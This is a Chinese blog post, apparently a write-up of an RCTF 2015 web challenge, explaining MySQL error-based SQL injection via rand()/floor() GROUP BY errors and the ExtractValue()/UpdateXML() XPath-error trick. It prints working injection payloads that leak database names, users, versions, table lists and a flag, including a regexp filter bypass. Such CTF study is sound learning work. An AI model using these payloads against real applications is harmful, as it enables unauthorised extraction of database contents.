title: SQL 显错注入
date: 2015-11-19 10:34:43
tags:
- Blogs
- sqli
categories:
- Blogs
---
在做rctf2015的一道web题目的时候，遇到了一个显错注入，学习不少姿势，写下来好好研究下...

<!--more-->

# rand()和order by冲突错误(转自知乎路西法)
一般意义上来说，我们常用的显错注入手段是这两个，在mysql的官方文档中有这样一句
**RAND() in a WHERE clause is re-evaluated every time the WHERE is executed.You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times.**
也就是说不能作为order by的条件字段，group by同理：
所以有一下payload：
```
+and+1=2+UNION+SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(select+concat(0x5f,database(),0x5f,user(),0x5f,version())))a+from+information_schema.tables+group+by+a)b--
```
其中a为:
```
concat(floor(rand(0)*2),(select+concat(0x5f,database(),0x5f,user(),0x5f,version())))
```
后面又group by a，所以会爆出
**Duplicate entry 'XXXXXXXXXX' for key 'group_key'**
其中XXXXX就是**0x5f,database(),0x5f,user(),0x5f,version()**的内容，这样一步步就能拿到想要的信息

在前面的payload中其实还有个很重要的函数是floor（）取整，在之前的文章中研究过，floor(rand()*2)这样会产生重复的随机数，从而在order by时候报错。

# ExtractValue（）和 UpdateXml（）（限制长度32位）
官方文档中关于这两个函数的解释是这样的：


| Name                | Description                                              |
| ------------------- |:--------------------------------------------------------:| 
| ExtractValue()      | Extracts a value from an XML string using XPath notation |
| UpdateXML()         | Return replaced XML fragment                             |


## ExtractValue(xml_frag, xpath_expr)
第一个参数：XML_frag是String格式，为XML文档对象的名称
第二个参数：XPath_expr (Xpath格式的字符串)

而且这种查找应该是跳过标签的，举几个例子
```
mysql> SELECT ExtractValue('<a><b/></a>', '/a/b');
+-------------------------------------+
| ExtractValue('<a><b/></a>', '/a/b') |
+-------------------------------------+
|                                     |
+-------------------------------------+
1 row in set (0.00 sec)
```
上面这个就是没有结果的
```
mysql> SELECT ExtractValue('<a><b/></a>', 'count(/a/b)');
+-------------------------------------+
| ExtractValue('<a><b/></a>', 'count(/a/b)') |
+-------------------------------------+
| 1                                   |
+-------------------------------------+
1 row in set (0.00 sec)
```
但是可以通过xpath语句，查询数量
```
mysql> SELECT ExtractValue('<a><c/></a>', 'count(/a/b)');
+-------------------------------------+
| ExtractValue('<a><c/></a>', 'count(/a/b)') |
+-------------------------------------+
| 0                                   |
+-------------------------------------+
1 row in set (0.01 sec)
```
如果格式不对，就返回0
```
mysql> SELECT
    ->   ExtractValue('<a>ccc<b>ddd</b></a>', '/a') AS val1,
    ->   ExtractValue('<a>ccc<b>ddd</b></a>', '/a/b') AS val2,
    ->   ExtractValue('<a>ccc<b>ddd</b></a>', '//b') AS val3,
    ->   ExtractValue('<a>ccc<b>ddd</b></a>', '/b') AS val4,
    ->   ExtractValue('<a>ccc<b>ddd</b><b>eee</b></a>', '//b') AS val5;

+------+------+------+------+---------+
| val1 | val2 | val3 | val4 | val5    |
+------+------+------+------+---------+
| ccc  | ddd  | ddd  |      | ddd eee |
+------+------+------+------+---------+
```
文档中是这么说的
**ExtractValue() returns only CDATA, and does not return any tags that might be contained within a matching tag, nor any of their content (see the result returned as val1 in the following example).**

## UpdateXML(xml_target, xpath_expr, new_xml)
第二个函数，官方文档的解释是这样的**This function replaces a single portion of a given fragment of XML markup xml_target with a new XML fragment new_xml, and then returns the changed XML. The portion of xml_target that is replaced matches an XPath expression xpath_expr supplied by the user.**
大概的意思应该是吧xml_target里面的xpath_expr位置替换成new_xml.
**If no expression matching xpath_expr is found, or if multiple matches are found, the function returns the original xml_target XML fragment. All three arguments should be strings.**
如果没有找到的话，就返回查询到的字符串。
```
mysql> SELECT
    ->   UpdateXML('<a><b>ccc</b><d></d></a>', '/a', '<e>fff</e>') AS val1,
    ->   UpdateXML('<a><b>ccc</b><d></d></a>', '/b', '<e>fff</e>') AS val2,
    ->   UpdateXML('<a><b>ccc</b><d></d></a>', '//b', '<e>fff</e>') AS val3,
    ->   UpdateXML('<a><b>ccc</b><d></d></a>', '/a/d', '<e>fff</e>') AS val4,
    ->   UpdateXML('<a><d></d><b>ccc</b><d></d></a>', '/a/d', '<e>fff</e>') AS val5
    -> \G

*************************** 1. row ***************************
val1: <e>fff</e>
val2: <a><b>ccc</b><d></d></a>
val3: <a><e>fff</e><d></d></a>
val4: <a><b>ccc</b><e>fff</e></a>
val5: <a><d></d><b>ccc</b><d></d></a>
```
现在我们知道上面两个函数是干嘛的了，现在进入正题
## 利用这两个函数显错注入
先放上来两个payload，一步步分析下
```
"%26%26extractvalue(1,concat(0x5c,(select(flag)from(flag))))%23
```
这是rctf web150的显错注入，如果注册用户名为这个，修改密码时就会出现
**ERROR 1105 (HY000): XPATH syntax error: RCTF{Good job! But flag not her**
可以发现报错显示了关键数据，虽然不是真正的flag。
这里为什么报错还是不太明白，可能是因为0x5c是不可以打印字符，别的也可以代替

于是回去翻翻别的表，这样的语法貌似是需要只有一个值，所以后面还要加上column_name!=xxx
```
ddog"&&extractvalue(1,concat(0x5c,(select(column_name)from(information_schema.columns)where(table_name='users')))
```
后来看了别人的writeup发现其实可以直接跑出来
```
ddog"||updateml(0x7c,concat((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1)#
```
然后发现users表中有一列是real_flag_is_here,然后就是查询匹配，但是substring left，right，reverse like都被拦截，所以用了regexp
```
username=ddog"||updatexml(0x7c,concat((select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp('^R'))),1)#&password=123&email=123
```
这样就得到了flag，最后再附上regexp的用法

## expr REGEXP pat, expr RLIKE pat
**Performs a pattern match of a string expression expr against a pattern pat. The pattern can be an extended regular expression, the syntax for which is discussed later in this section. Returns 1 if expr matches pat; otherwise it returns 0. If either expr or pat is NULL, the result is NULL. RLIKE is a synonym for REGEXP, provided for mSQL compatibility.**

举两个例子
```
mysql> SELECT 'Monty!' REGEXP '.*';
        -> 1
mysql> SELECT 'new*\n*line' REGEXP 'new\\*.\\*line';
        -> 1
mysql> SELECT 'a' REGEXP 'A', 'a' REGEXP BINARY 'A';
        -> 1  0
mysql> SELECT 'a' REGEXP '^[a-d]';
        -> 1
```
不同的符号有不同的用法，还是放上官方文档的地址，有兴趣自己去看吧。
[https://dev.mysql.com/doc/refman/5.7/en/regexp.html](https://dev.mysql.com/doc/refman/5.7/en/regexp.html)